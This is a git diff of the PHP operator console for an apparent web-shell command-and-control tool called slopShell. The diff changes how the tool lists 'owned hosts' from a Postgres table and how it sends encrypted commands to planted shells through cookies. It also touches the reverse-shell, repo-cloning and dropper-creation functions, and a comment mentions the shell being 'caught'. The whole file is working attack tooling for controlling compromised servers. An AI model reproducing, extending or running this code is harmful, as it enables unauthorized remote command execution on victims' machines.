@@ -48,7 +48,7 @@ try {
     print("{$e}\n\n");
 }
 
-function logo($last, $cl, bool $error, $error_value)
+function logo($last, $cl, bool $error, $error_value, string $lastHost)
 {
     if ($last === "q") {
         system($cl);
@@ -64,7 +64,6 @@ function logo($last, $cl, bool $error, $error_value)
         echo("\033[33;40m  Gr33tz: Notroot, J5                                                               \033[0m\n");
         echo("\033[33;40m  Git: https://github.com/oldkingcone/slopShell                                     \033[0m\n");
         print("\033[33;40m  All proxybroker instances have been killed, they died in peace.. in their sleep. F in chat to pay respects.\n");
-        curl_close(CHH);
     } else if (is_null($last)) {
         system($cl);
         echo("\033[33;40m                                                                                    \033[0m\n");
@@ -89,6 +88,7 @@ function logo($last, $cl, bool $error, $error_value)
         echo("\033[33;40m                         ▀     ▀                                     █   ██         \033[0m\n");
         echo("\033[33;40m                                                                                    \033[0m\n");
         echo("\033[33;40m  Last command: $last                                                               \033[0m\n");
+        print(sprintf("\033[33;40m   Last Host -> %s",$lastHost)."\033[0m\n");
         if ($error === true && !empty($error_value)) {
             if (is_array($error_value)) {
                 echo("\033[33;40m  What was the error:                                                           \033[0m\n");
@@ -147,15 +147,16 @@ function opts()
 
 function sys($host, $uri)
 {
-    $curlHandle = CHH;
     if (!empty($host) && !empty($userA)) {
-        curl_setopt($curlHandle, CURLOPT_URL, "$host/$uri?qs=cqBS");
-        curl_setopt($curlHandle, CURLOPT_TIMEOUT, 15);
-        curl_setopt($curlHandle, CURLOPT_CONNECTTIMEOUT, 15);
-        curl_setopt($curlHandle, CURLOPT_RETURNTRANSFER, true);
-        $syst = curl_exec($curlHandle);
-        if (!curl_errno($curlHandle)) {
-            switch (curl_getinfo($curlHandle, CURLINFO_HTTP_CODE)) {
+        $tc = pg_exec(pg_connect(DBCONN), sprintf("SELECT rhost,uri FROM sloppy_bots_main WHERE id = '%s'", $host));
+        $axX = pg_fetch_row($tc);
+        curl_setopt(CHH, CURLOPT_URL, $axX[0].$axX[1]."?qs=cqBS");
+        curl_setopt(CHH, CURLOPT_TIMEOUT, 15);
+        curl_setopt(CHH, CURLOPT_CONNECTTIMEOUT, 15);
+        curl_setopt(CHH, CURLOPT_RETURNTRANSFER, true);
+        $syst = curl_exec(CHH);
+        if (!curl_errno(CHH)) {
+            switch (curl_getinfo(CHH, CURLINFO_HTTP_CODE)) {
                 case 200:
                     return $syst;
                 default:
@@ -164,7 +165,7 @@ function sys($host, $uri)
 
         }
     } else {
-        logo('s', clears, true, "Host and/or URI was empty, please double check.");
+        logo('s', clears, true, "Host and/or URI was empty, please double check.", $host);
     }
     return 0;
 }
@@ -191,20 +192,19 @@ function rev($host, $shell, $port, $os)
         }
         echo "[ ++ ] Trying: " . $host . " on " . $usePort . "[ ++ ]\n";
     } else {
-        logo('reverse', clears, true, '');
+        logo('reverse', clears, true, '', $host);
     }
 
 }
 
-function co($command, $host, $uri, bool $encrypt)
+function co($command, $host, bool $encrypt)
 {
-    $curlHandle = CHH;
     if ($encrypt === true && !is_null($command)) {
         $our_nonce = openssl_random_pseudo_bytes(SODIUM_CRYPTO_AEAD_XCHACHA20POLY1305_IETF_NPUBBYTES);
         $secure_Key = openssl_random_pseudo_bytes(SODIUM_CRYPTO_AEAD_XCHACHA20POLY1305_IETF_KEYBYTES);
         $additionalData = openssl_random_pseudo_bytes(SODIUM_CRYPTO_AEAD_XCHACHA20POLY1305_IETF_ABYTES);
         try {
-            $un = base64_encode(serialize(array("plain" => $command)));
+            $un = base64_encode(serialize($command));
             $ct = sodium_crypto_aead_xchacha20poly1305_ietf_encrypt($un, $additionalData, $our_nonce, $secure_Key);
             $cr = "2";
             $space_Safe_coms = base64_encode(bin2hex($our_nonce) . "." . bin2hex($secure_Key) . "." . bin2hex($additionalData) . "." . base64_encode($ct));
@@ -216,35 +216,36 @@ function co($command, $host, $uri, bool $encrypt)
         }
     } else {
         $cr = "1";
-        $space_Safe_coms = base64_encode(serialize(array("cr" => base64_encode($command))));
+        $space_Safe_coms = base64_encode(serialize(base64_encode($command)));
     }
-    if (!empty($host) && !is_null($space_Safe_coms) && !is_null($cr) && !empty($uri)) {
-        curl_setopt($curlHandle, CURLOPT_URL, "$host/$uri");
-        curl_setopt($curlHandle, CURLOPT_TIMEOUT, 15);
-        curl_setopt($curlHandle, CURLOPT_CONNECTTIMEOUT, 15);
-        curl_setopt($curlHandle, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($curlHandle, CURLOPT_POST, true);
+    if (!empty($host) && !is_null($space_Safe_coms) && !is_null($cr)) {
+        $tcO = pg_exec(pg_connect(DBCONN), sprintf("SELECT rhost,uri FROM sloppy_bots_main WHERE id = '%s'", $host));
+        $axX = pg_fetch_row($tcO);
+        curl_setopt(CHH, CURLOPT_URL, $axX[0].$axX[1]);
+        curl_setopt(CHH, CURLOPT_TIMEOUT, 15);
+        curl_setopt(CHH, CURLOPT_CONNECTTIMEOUT, 15);
+        curl_setopt(CHH, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt(CHH, CURLOPT_POST, true);
         //this is the default value the shell will be looking for, change it make it unique.
         // and for those of you who read the source before you run. Howd ya get so smort.
-        curl_setopt($curlHandle, CURLOPT_COOKIE, "cx={$space_Safe_coms}");
-        curl_setopt($curlHandle, CURLOPT_POSTFIELDS, "cr={$cr}");
-        $syst = curl_exec($curlHandle);
-        if (!curl_errno($curlHandle)) {
-            switch ($http_code = curl_getinfo($curlHandle, CURLINFO_HTTP_CODE)) {
+        curl_setopt(CHH, CURLOPT_COOKIE, "cx={$space_Safe_coms}");
+        curl_setopt(CHH, CURLOPT_POSTFIELDS, "cr={$cr}");
+        $syst = curl_exec(CHH);
+        if (!curl_errno(CHH)) {
+            switch (curl_getinfo(CHH, CURLINFO_HTTP_CODE)) {
                 case 200:
-                    return $syst;
+                    echo $syst;
+                    break;
                 default:
-                    logo('co', clears, true, "Appears our shell was caught, or the reported URI was wrong.\nPlease Manually confirm.\n");
+                    logo('co', clears, true, "Appears our shell was caught, or the reported URI was wrong.\nPlease Manually confirm.\n", $axX[0]);
             }
 
         }
     } else {
         $error = array(
             "Command" => $command,
-            "Host" => $host,
-            "URI" => $uri
         );
-        logo('co', clears, true, $error);
+        logo('co', clears, true, $error, $host);
     }
     return 0;
 }
@@ -252,7 +253,9 @@ function co($command, $host, $uri, bool $encrypt)
 function clo($host, $repo, $uri)
 {
     if (!empty($host) && !empty($repo) && !empty($uri)) {
-        curl_setopt(CHH, CURLOPT_URL, "$host/$uri");
+        $tc = pg_exec(pg_connect(DBCONN), sprintf("SELECT rhost,uri FROM sloppy_bots_main WHERE id = '%s'", $host));
+        $axX = pg_fetch_row($tc);
+        curl_setopt(CHH, CURLOPT_URL, $axX[0].$axX[1]);
         curl_setopt(CHH, CURLOPT_TIMEOUT, 15);
         curl_setopt(CHH, CURLOPT_CONNECTTIMEOUT, 15);
         curl_setopt(CHH, CURLOPT_RETURNTRANSFER, true);
@@ -274,7 +277,7 @@ function clo($host, $repo, $uri)
                 "Target URI" => $uri,
                 "Curl Error" => $http_code
             );
-            logo('cloner', clears, true, $errors);
+            logo('cloner', clears, true, $errors, $host);
         }
         curl_close(CHH);
     } else {
@@ -283,7 +286,7 @@ function clo($host, $repo, $uri)
             "Repo" => $repo,
             "Target URI" => $uri
         );
-        logo('cloner', clears, true, $errors);
+        logo('cloner', clears, true, $errors, $host);
     }
 
 }
@@ -327,7 +330,7 @@ function createDropper($callHome, $callhomePort, $duration, $obfsucate, $depth)
                 "Depth" => $depth,
                 "Actual Exception" => $exception
             );
-            logo('cr', clears, true, $empty);
+            logo('cr', clears, true, $empty, '');
         }
 
     } else {
@@ -337,7 +340,7 @@ function createDropper($callHome, $callhomePort, $duration, $obfsucate, $depth)
             "Obfuscate" => $obfsucate,
             "Depth" => $depth
         );
-        logo('cr', clears, true, $empty);
+        logo('cr', clears, true, $empty, '');
     }
 }
 
@@ -362,8 +365,29 @@ function aHo($host, $os, $checkIn)
             }
         }
     } else {
-        logo('add host', clears, true, $host);
+        logo('add host', clears, true, $host, $host);
     }
+}
+
+function awesomeMenu()
+{
+    $axx = pg_exec(pg_connect(DBCONN), "SELECT * FROM sloppy_bots_main");
+    $count = pg_exec(pg_connect(DBCONN), 'SELECT COUNT(*) FROM (SELECT rhost from sloppy_bots_main WHERE rhost IS NOT NULL) AS TEMP');
+    echo str_repeat("+", 35) . "[ OWNED HOSTS ]" . str_repeat("+", 39) . "\n\n";
+    $a = 0;
+    foreach (pg_fetch_all($axx) as $tem => $use) {
+        print(sprintf("[ ID: ]-> %s [ RHOST: ]-> %s [ URI: ]-> %s [ OS_FLAVOR: ]-> %s [ CHECKED_IN: ]-> %s\n",
+            $use['id'],
+            $use['rhost'],
+            $use['uri'],
+            $use['os_flavor'],
+            $use['check_in']
+
+        ));
+    }
+    pg_free_result($count);
+    pg_free_result($axx);
+    echo "\n\n" . str_repeat("+", 35) . "[ END OWNED HOSTS ]" . str_repeat("+", 35) . "\n\n";
 }
 
 function check($host, $path, $batch)
@@ -404,7 +428,6 @@ function check($host, $path, $batch)
                 break;
             case "n":
                 if (!empty($host) && !empty($path)) {
-
                     $tc = pg_exec(pg_connect(DBCONN), sprintf("SELECT rhost,uri FROM sloppy_bots_main WHERE id = '%s'", $host));
                     $axX = pg_fetch_row($tc);
                     curl_setopt(CHH, CURLOPT_URL, $axX[0].$axX[1] ."?qs=cqS");
@@ -431,7 +454,7 @@ function check($host, $path, $batch)
                 }
         }
     } else {
-        logo("cr", "", true, "");
+        logo("cr", "", true, "", $host);
     }
 }
 
@@ -473,7 +496,7 @@ function queryDB($host, $fetchWhat)
                 "Fetch What?" => $fetchWhat,
                 "Explicit Error" => $e
             );
-            logo('query DB', clears, true, $errors);
+            logo('query DB', clears, true, $errors, $host);
         }
 
 
@@ -482,20 +505,20 @@ function queryDB($host, $fetchWhat)
             "Host" => $host,
             "Fetch What?" => $fetchWhat
         );
-        logo('query DB', clears, true, $errors);
+        logo('query DB', clears, true, $errors, $host);
     }
     return 0;
 }
 
 
 $run = true;
-logo($lc = null, clears, "", "");
+logo($lc = null, clears, "", "", '');
 while ($run) {
     print("\n\033[33;40mPlease select your choice: \n->");
     echo("\033[0m");
     $pw = trim(fgets(STDIN));
     $lc = $pw;
-    logo($lc, clears, "", "");
+    logo($lc, clears, "", "", '');
     switch (strtolower($pw)) {
         case "cr":
             system(clears);
@@ -517,21 +540,23 @@ while ($run) {
             break;
         case "s":
             system(clears);
+            awesomeMenu();
             $h = readline("Which host are we checking?\n->");
             try {
                 sys($h, queryDB($h, "s"));
             } catch (Exception $e) {
-                logo("s", clears, true, $e);
+                logo("s", clears, true, $e, $h);
             }
             break;
         case "r":
             system(clears);
+            awesomeMenu();
             $h = readline("Please tell me the host.\n->");
             $p = readline("\nWhich port shall we use?\n->");
             try {
                 $o = !empty(queryDB($h, 'r')) ? "win" : "lin";
             } catch (Exception $e) {
-                logo("r", clears, true, $e);
+                logo("r", clears, true, $e, '');
             }
             echo $o;
             if (!empty($h) && !empty($p)) {
@@ -541,6 +566,7 @@ while ($run) {
         case "c":
             system(clears);
             try {
+                awesomeMenu();
                 $h = readline("Which host are we sending the command to?\n->");
                 $c = readline("And now the command: \n->");
                 $e = readline("Are we needing to encrypt?\n(y/n)->");
@@ -552,19 +578,20 @@ while ($run) {
                         $encrypt = false;
                         break;
                 }
-                co($c, $h, queryDB($h, 'c'), $encrypt); // defaulting to false for now. until all apsects of that call are worked out and added to the shell.
+                co($c, $h, $encrypt); // defaulting to false for now. until all apsects of that call are worked out and added to the shell.
             } catch (Exception $e) {
-                logo("c", clears, true, $e);
+                logo("c", clears, true, $e, $h);
             }
             break;
         case "cl":
             system(clears);
             try {
+                awesomeMenu();
                 $h = readline("Which host are we interacting with?\n->");
                 $rep = readline("Repo to clone?\n->");
                 clo($h, $rep, queryDB($h, "cl"));
             } catch (Exception $e) {
-                logo("cl", clears, true, $e);
+                logo("cl", clears, true, $e, $h);
             }
             break;
         case "u":
@@ -583,62 +610,43 @@ while ($run) {
                 $o = readline("Do you know the OS?\n->");
                 aHo($h, $o, 0);
             } catch (Exception $e) {
-                logo("a", clears, true, $e);
+                logo("a", clears, true, $e, $h);
             }
             break;
         case "ch":
             system(clears);
-            try {
-                $axx = pg_exec(pg_connect(DBCONN), "SELECT * FROM sloppy_bots_main LIMIT 20");
-                $count = pg_exec(pg_connect(DBCONN), 'SELECT COUNT(*) FROM (SELECT rhost from sloppy_bots_main WHERE rhost IS NOT NULL) AS TEMP');
-                echo str_repeat("+", 35) . "[ OWNED HOSTS ]" .str_repeat("+", 39)."\n\n";
-                $a = 0;
-                foreach (pg_fetch_all($axx) as $tem => $use){
-                    print(sprintf("[ ID: ]-> %s [ RHOST: ]-> %s [ URI: ]-> %s [ OS_FLAVOR: ]-> %s [ CHECKED_IN: ]-> %s\n",
-                        $use['id'],
-                        $use['rhost'],
-                        $use['uri'],
-                        $use['os_flavor'],
-                        $use['check_in']
-
-                    ));
-                }
-                echo "\n\n".str_repeat("+", 35) . "[ END OWNED HOSTS ]" .str_repeat("+", 35)."\n\n";
+            try{
                 $b = readline("Is this going to be a batch job?(Y/N)\n->");
                 switch (!empty(strtolower($b))) {
                     case "n":
                         echo "Not executing batch job.\n";
                         $h = readline("Who is it we need to check on?(based on ID)\n->");
                         check($h, "chR", "n");
-                        pg_free_result($count);
-                        pg_free_result($axx);
                         break;
                     case "y":
                         echo "Executing batch job!\n";
                         check('0', 'b', "y");
-                        pg_free_result($count);
-                        pg_free_result($axx);
                         break;
                     default:
-                        logo('ch', clears, true, "Your host was empty, sorry but I will return you to the previous menu.\n");
+                        logo('ch', clears, true, "Your host was empty, sorry but I will return you to the previous menu.\n", '');
                         break;
                 }
             } catch (Exception $e) {
-                logo("ch", clears, true, $e);
+                logo("ch", clears, true, $e, '');
             }
             break;
         case "m":
-            logo($lc, clears, "", "");
+            logo($lc, clears, "", "", '');
             break;
         case "q":
-            logo('q', clears, false, '');
+            logo('q', clears, false, '', '');
             $run = false;
             break;
         case "o":
             opts();
             break;
         default:
-            logo($lc, clears, "", "");
+            logo($lc, clears, "", "", '');
             echo "\033[33;40myou need to select a valid option...\033[0m\n";
     }
 }
